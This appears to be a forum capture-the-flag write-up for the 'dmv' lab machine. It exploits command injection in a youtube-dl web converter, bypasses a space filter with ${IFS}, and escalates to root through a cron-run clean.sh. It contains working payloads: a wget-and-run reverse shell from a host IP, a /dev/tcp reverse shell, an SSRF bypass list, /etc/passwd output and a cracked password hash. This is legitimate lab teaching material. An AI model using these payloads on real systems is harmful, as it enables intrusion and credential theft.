<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/4/4bf108a54b8b19ecdbd250eb2269c0622f630623.png" data-download-href="/uploads/short-url/aPOdOhHagzNKrVhI7zc6sLketMv.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/4/4bf108a54b8b19ecdbd250eb2269c0622f630623.png" alt="" data-base62-sha1="aPOdOhHagzNKrVhI7zc6sLketMv" width="690" height="386" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">1140√ó638 37.9 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Nothing ! but something isn‚Äôt normal if you take a look at the url_original value in the response you won‚Äôt see</p>
<p>the ‚Äòwhoami‚Äô maybe it‚Äôs restricting some commands or maybe it takes only what before the space ? let‚Äôs URL Encode that and try (the space in URL Encode is +)</p>
<p>nothing too ! still not showing the whoami let‚Äôs write whoami without the ‚Äî exec and without single quotes</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/5/5ee81bf015a78fb1b280defca214bca371b1df18.png" data-download-href="/uploads/short-url/dxAaLS91kcmWxQCzoVLWvXWb3CM.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/5/5ee81bf015a78fb1b280defca214bca371b1df18.png" alt="" data-base62-sha1="dxAaLS91kcmWxQCzoVLWvXWb3CM" width="690" height="90" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">1130√ó148 11.5 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>so the problem isn‚Äôt in whoami let‚Äôs write it with single quotes</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/7/7e781e098ebd8080e07f920f35c104fa75228d62.png" data-download-href="/uploads/short-url/i2NvI78GpwmzmzdYZOeQhqcAeau.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/7/7e781e098ebd8080e07f920f35c104fa75228d62.png" alt="" data-base62-sha1="i2NvI78GpwmzmzdYZOeQhqcAeau" width="690" height="64" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">1119√ó105 6.56 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Now am 100% sure that the problem is in spaces cause I tried also to send more than 20 characters here is an example</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/2/256d2c150a4255a0948f2beb3588c00a0c3d8660.png" alt="" data-base62-sha1="5l5z8ChgdhB3aub216Kxqy1OHio" width="690" height="58" role="presentation"></p>
<p>So for a quick and smart scan let‚Äôs send this over Intruder using special characters list ‚Ä¶</p>
<aside class="onebox githubblob" data-onebox-src="../../../external.html?link=https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt">
  <header class="source">

      <a href="../../../external.html?link=https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt" target="_blank" rel="noopener nofollow ugc">github.com/danielmiessler/SecLists</a>
  </header>

  <article class="onebox-body">
    <h4><a href="../../../external.html?link=https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt" target="_blank" rel="noopener nofollow ugc">Fuzzing/special-chars.txt</a></h4>

<div class="git-blob-info">
  <a href="../../../external.html?link=https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt" rel="noopener nofollow ugc"><code>master</code></a>
</div>


      <pre><code class="lang-txt">~
!
@
#
$
%
^
&amp;
*
(
)
-
_
+
=
{
}
]
[
|
</code></pre>



  This file has been truncated. <a href="../../../external.html?link=https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt" target="_blank" rel="noopener nofollow ugc">show original</a>

  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>The images below will explain how to use the Intruder in BurpSuite</p>
<ol>
<li>Configure the position of where you want the payloads will be inserted (write anything and select it and click on Add)</li>
</ol>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/5/54e47dc115adf26fd3662f2f9f5d58c59e679ca6.png" data-download-href="/uploads/short-url/c6ZE9OAGL6tCfN4icLdAKPeYeCq.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/5/54e47dc115adf26fd3662f2f9f5d58c59e679ca6.png" alt="" data-base62-sha1="c6ZE9OAGL6tCfN4icLdAKPeYeCq" width="690" height="368" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">1138√ó608 28.2 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<ol start="2">
<li>Copy the special characters list and paste it here (The Payload Section)</li>
</ol>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/2/2da7185298400aee5156d79e20afa0aa745c10ea.png" data-download-href="/uploads/short-url/6vRu6yZSpjlVB8lKWC6A7ib1KJA.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/2/2da7185298400aee5156d79e20afa0aa745c10ea.png" alt="" data-base62-sha1="6vRu6yZSpjlVB8lKWC6A7ib1KJA" width="690" height="368" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">1136√ó606 27.8 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Now Click on Start Attack, To compare between the sent requests we should take a look at length case</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/2/2cdaa7077bd2bd5680d74cac7b0a69cfca2cf54b.png" data-download-href="/uploads/short-url/6oNt6up2CGDhKThupce5E4sR7NV.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/2/2cdaa7077bd2bd5680d74cac7b0a69cfca2cf54b.png" alt="" data-base62-sha1="6oNt6up2CGDhKThupce5E4sR7NV" width="690" height="495" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">750√ó539 25.6 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>As you see many different values let‚Äôs eliminate the 564 ones cause they had the same error message which is</p>
<p>{‚Äústatus‚Äù:1,‚Äúerrors‚Äù:‚ÄúWARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: u‚Äô!‚Äô is not a valid URL. Set --default-search "ytsearch" (or run youtube-dl "ytsearch:!" ) to search YouTube\n‚Äù,‚Äúurl_orginal‚Äù:‚Äú!‚Äù,‚Äúoutput‚Äù:‚Äú‚Äù,‚Äúresult_url‚Äù:‚Äú/tmp/downloads/5e9881edeff6e.mp3‚Äù}</p>
<p>but the special cases having this</p>
<p>{‚Äústatus‚Äù:2,‚Äúerrors‚Äù:" <strong>sh: 1:</strong> cannot open -f: No such file\n",‚Äúurl_orginal‚Äù:‚Äú&lt;‚Äù,‚Äúoutput‚Äù:‚Äú‚Äù,‚Äúresult_url‚Äù:‚Äú/tmp/downloads/5e98820f668c1.mp3‚Äù}</p>
<p>something is saying ‚Äú sh ‚Äú <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"> let‚Äôs go back to out Intruder and to the options tab</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/e/ef360cf5f26b878356d582a3014eebe8cef82b38.png" data-download-href="/uploads/short-url/y89UWe6eDHgAYAWm8PxGPMkFRvG.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/e/ef360cf5f26b878356d582a3014eebe8cef82b38.png" alt="" data-base62-sha1="y89UWe6eDHgAYAWm8PxGPMkFRvG" width="436" height="500" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">566√ó649 21 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>In the Grep ‚Äî Match section clear all the values and add sh: 1 or just sh: and go back to the results tab</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/f/f2e7345673d161d9bed8dd499adec92f0ce2a996.png" data-download-href="/uploads/short-url/yEOTRLXCfi4I1KntvIYuyagsojY.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/f/f2e7345673d161d9bed8dd499adec92f0ce2a996.png" alt="" data-base62-sha1="yEOTRLXCfi4I1KntvIYuyagsojY" width="690" height="218" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">757√ó240 12.4 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>No we reduce the results to only 9 characters that bypass the program and lead us to use the sh/bash commands ‚Ä¶</p>
<p>In the request we have the backquote or the grave accent</p>
<p>If you don‚Äôt know what backquote does read this:</p>
<p>When the old-style backquote form of substitution is used, backslash<br>
retains its literal meaning except when followed by $, `, or . The<br>
first backquote not preceded by a backslash terminates the command sub‚Äê<br>
stitution. When using the $(command) form, all characters between the<br>
parentheses make up the command; none are treated specially.Command substitutions may be nested. To nest when using the backquoted<br>
form, escape the inner backquotes with backslashes.</p>
<p>So to make things easier for you guys here is our new payload list</p>
<p>&amp;<br>
(<br>
)<br>
|<br>
`<br>
‚Äô<br>
"<br>
&lt;<br>
;</p>
<p>Let‚Äôs run another intruder but this time let‚Äôs include a command with backquote <code>id</code></p>
<p>and the command was executed successfully but isn‚Äôt showing all the command return !</p>
<p>So if you go down to the response of the other payloads we only one that print everything</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/d/d0c4375514562b6d339089ebb3ef1061fae3e7d2.png" data-download-href="/uploads/short-url/tMPHI0W4Lnwq02J6HP2nbt1kztM.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/d/d0c4375514562b6d339089ebb3ef1061fae3e7d2.png" alt="" data-base62-sha1="tMPHI0W4Lnwq02J6HP2nbt1kztM" width="690" height="264" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">827√ó317 16.4 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>so we are going to use this from <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"> let‚Äôs send that to our repeater and start typing several commands</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/c/c50fe4762122dfa68889dfaf344d947c0edabc05.png" data-download-href="/uploads/short-url/s7i6SRHjsWyokkJWU6KacJQczC5.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/c/c50fe4762122dfa68889dfaf344d947c0edabc05.png" alt="" data-base62-sha1="s7i6SRHjsWyokkJWU6KacJQczC5" width="690" height="236" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">1124√ó386 27.8 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>as you see everything works but still something how to bypass the spaces thing !</p>
<p>if we run ls -la and URL Encode this we get an error message</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/b/be4c15725761627ddaf8fdece014a1e79aa47e2f.png" data-download-href="/uploads/short-url/r9rJ8UdStvgn4HwSgl1vTpFGqGX.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/b/be4c15725761627ddaf8fdece014a1e79aa47e2f.png" alt="" data-base62-sha1="r9rJ8UdStvgn4HwSgl1vTpFGqGX" width="690" height="161" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">1136√ó266 20.9 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>So I know a bash trick that allows you to bypass WAF and many other space restrictions</p>
<p>replace space with a special shell variable known as ‚Äú${IFS}‚Äù <a href="../../../external.html?link=https://bash.cyberciti.biz/guide/$IFS" rel="noopener nofollow ugc">The Internal field separator</a></p>
<p>and here is a good List for bypassing I found on google (I didn‚Äôt try it but they seems correct)</p>
<aside class="onebox githubgist" data-onebox-src="../../../external.html?link=https://gist.github.com/bayotop/6072e9c87632e5f75dd42483b0076294">
  <header class="source">

      <a href="../../../external.html?link=https://gist.github.com/bayotop/6072e9c87632e5f75dd42483b0076294" target="_blank" rel="noopener nofollow ugc">gist.github.com</a>
  </header>

  <article class="onebox-body">
    <h4><a href="../../../external.html?link=https://gist.github.com/bayotop/6072e9c87632e5f75dd42483b0076294" target="_blank" rel="noopener nofollow ugc">https://gist.github.com/bayotop/6072e9c87632e5f75dd42483b0076294</a></h4>

  <h5>bypasses.txt</h5>
  <pre><code class="Text"># SSRF localhost (@omespino)

http://127.0.0.1
http://[::]/                # ipv6
http://0/  
http://localtest.me         # dns to 127.0.0.1
http://2130706433/          # decimal
http://0x7f000001/          # hex
http://0x7f.0x00.0x00.0x01  # hex
http://0177.0.0.01          # octal</code></pre>
   This file has been truncated. <a href="../../../external.html?link=https://gist.github.com/bayotop/6072e9c87632e5f75dd42483b0076294" target="_blank" rel="noopener nofollow ugc">show original</a>

<p>
</p>

  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/6/6c3ee0bb2c682a2169fe1427a2f57e24568e19c1.png" data-download-href="/uploads/short-url/frAhtZ0C6cj0Ki8zFI3HT9ONUFX.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/6/6c3ee0bb2c682a2169fe1427a2f57e24568e19c1.png" alt="" data-base62-sha1="frAhtZ0C6cj0Ki8zFI3HT9ONUFX" width="690" height="305" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">1139√ó504 37.5 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>So the easiest way to use this and for few spaces we should start the python SimpleHTTPServer and download our shell to this Box and run it</p>
<p>yt_url=%3c<code>cd${IFS}/var/www/html/images/;wget${IFS}http://192.168.56.1:8080/rev.py;python${IFS}rev.py</code></p>
<p>images is a writable folder we can find after using ls -la we have also tmp directory and the main is writable too but this just to check if we can run 3 commands in one line using (<img src="../../images/emoji/twitter/wink8e5e.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"> separator ,so let‚Äôs check if our Listener (nc) is UP and execute the command ‚Ä¶</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/c/c5c439454f4c1d8de7835fff263890ce87cb9a2b.png" data-download-href="/uploads/short-url/sdwt50TYRW9g4NuzbhBkrivBV47.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/c/c5c439454f4c1d8de7835fff263890ce87cb9a2b.png" alt="" data-base62-sha1="sdwt50TYRW9g4NuzbhBkrivBV47" width="689" height="175" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">1344√ó341 25.8 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>The response isn‚Äôt returning anything which means we are successfully connected to the shell <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
<p>cat /etc/passwd<br>
root:x:0:0:root:/root:/bin/bash<br>
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>
bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>
sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>
sync:x:4:65534:sync:/bin:/bin/sync<br>
games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>
systemd-network:x:100:102:systemd Network Management,:/run/systemd/netif:/usr/sbin/nologin<br>
systemd-resolve:x:101:103:systemd Resolver,:/run/systemd/resolve:/usr/sbin/nologin<br>
syslog:x:102:106::/home/syslog:/usr/sbin/nologin<br>
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin<br>
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin<br>
lxd:x:105:65534::/var/lib/lxd/:/bin/false<br>
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin<br>
dnsmasq:x:107:65534:dnsmasq,:/var/lib/misc:/usr/sbin/nologin<br>
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin<br>
pollinate:x:109:1::/var/cache/pollinate:/bin/false<br>
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin<br>
dmv:x:1000:1000:dmv:/home/dmv:/bin/bash</p>
<p>let‚Äôs search for the first flag</p>
<p>going to the main directory (/var/www/html/)</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/8/859b6921293afd11aa536abe89259a6df3011dd8.png" data-download-href="/uploads/short-url/j3Wt6hUyK5ql9NKkuRISFZCfLvi.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/8/859b6921293afd11aa536abe89259a6df3011dd8.png" alt="" data-base62-sha1="j3Wt6hUyK5ql9NKkuRISFZCfLvi" width="543" height="212" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">543√ó212 12 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>you will find the first flag on the admin directory</p>
<p>cat /var/www/html/admin/flag.txt<br>
flag{0d8486a0c0c42503bb60ac77f4046ed7}</p>
<p>and also .htpasswd file</p>
<p>cat /var/www/html/admin/.htpasswd<br>
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/</p>
<p>If we crack the hash using hashcat we‚Äôll got <strong>jessie</strong></p>
<p>itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/:jessie</p>
<p>maybe this will be useful for the root part ‚Ä¶</p>
<p>Let‚Äôs go to the ROOT Part ! (is going to be short this time)</p>
<p>I uploaded many tools for enumeration as LinEnum and LinPeas but couldn‚Äôt find anything with these</p>
<p>I tried to use the password we found for the user dmv and nothing too !</p>
<p>I asked for a friend who did the box before I download it <img src="../../images/emoji/twitter/stuck_out_tongue8e5e.png?v=15" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:" loading="lazy" width="20" height="20"></p>
<p>and he said look in cronjobs but still not finding a thing here !</p>
<p>So I remember that I saw a file in /tmp/ directory named clean.sh with one line</p>
<p>rm -rf downloads</p>
<p>so it clear the bash script delete the folder ‚Äúdownloads‚Äù !</p>
<p>So I modified it and put this line</p>
<p>bash -c ‚Äòbash -i &gt;&amp; /dev/tcp/192.168.56.1/4444 0&gt;&amp;1‚Äô</p>
<p>and I again run my listener on port 4444</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/c/c4cabeb4906db70865d5901488e1f39a918e501c.png" data-download-href="/uploads/short-url/s4TXII6OZNxV6PscQKUJPJ1atpW.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/c/c4cabeb4906db70865d5901488e1f39a918e501c.png" alt="" data-base62-sha1="s4TXII6OZNxV6PscQKUJPJ1atpW" width="690" height="381" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">711√ó393 35.4 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>and I was lucky we are r00t <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
<p>So another way to get the root is using pspy a processor spy</p>
<aside class="onebox allowlistedgeneric" data-onebox-src="../../../external.html?link=https://github.com/DominicBreuker/pspy/releases">
  <header class="source">
      <img src="../../../external.html?link=https://github.githubassets.com/favicons/favicon.svg" class="site-icon" alt="" width="32" height="32">

      <a href="../../../external.html?link=https://github.com/DominicBreuker/pspy/releases" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/344;"><img src="../../../external.html?link=https://opengraph.githubassets.com/c1a3dec86a95aa8e56e4b7f9c09e45cd84104f35a31422d5abfb868302fd5dad/DominicBreuker/pspy" class="thumbnail" alt="" width="690" height="345"></div>

<h3><a href="../../../external.html?link=https://github.com/DominicBreuker/pspy/releases" target="_blank" rel="noopener nofollow ugc">Releases ¬∑ DominicBreuker/pspy</a></h3>

  <p>Monitor linux processes without root permissions. Contribute to DominicBreuker/pspy development by creating an account on GitHub.</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>(All the releases are in the link above for both 32bits and 64bits)</p>
<p>from the command uname -a in your shell you‚Äôll define the system CPU architecture</p>
<p>Linux dmv 4.15.0-96-generic <span class="hashtag-raw">#97-Ubuntu</span> SMP Wed Apr 1 03:25:46 UTC 2020 <strong>x86_64</strong></p>
<p>let‚Äôs upload it to our shell and make it executable (chmod +x pspy64) and execute it</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/2/22c9c58221fa0d6492229ec10d383cf407b5c489.png" data-download-href="/uploads/short-url/4XKwHCqHG0JuH3wUTyWcZ9P1tjP.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/2/22c9c58221fa0d6492229ec10d383cf407b5c489.png" alt="" data-base62-sha1="4XKwHCqHG0JuH3wUTyWcZ9P1tjP" width="690" height="123" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">981√ó175 27.5 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>So as you see the task is executed each minute with root privileges and our injected reverse shell is still being executed.</p>
<p>I hope everything was clear and excuse my English I‚Äôm doing my best here <img src="../../images/emoji/twitter/slight_smile8e5e.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="6" />
              <span class='post-likes'>6 Likes</span>
            </div>


            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/system.html'><span itemprop='name'>system</span></a>
                (system)
                  Closed 
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2020-08-28T06:33:49Z' class='post-time'>
                    August 28, 2020,  6:33am
                  </time>
                  <meta itemprop='dateModified' content='2020-08-28T06:33:49Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="hAUMCaeVswVHVhR74ijlHSQYH"></script>
  </body>
  
</html>
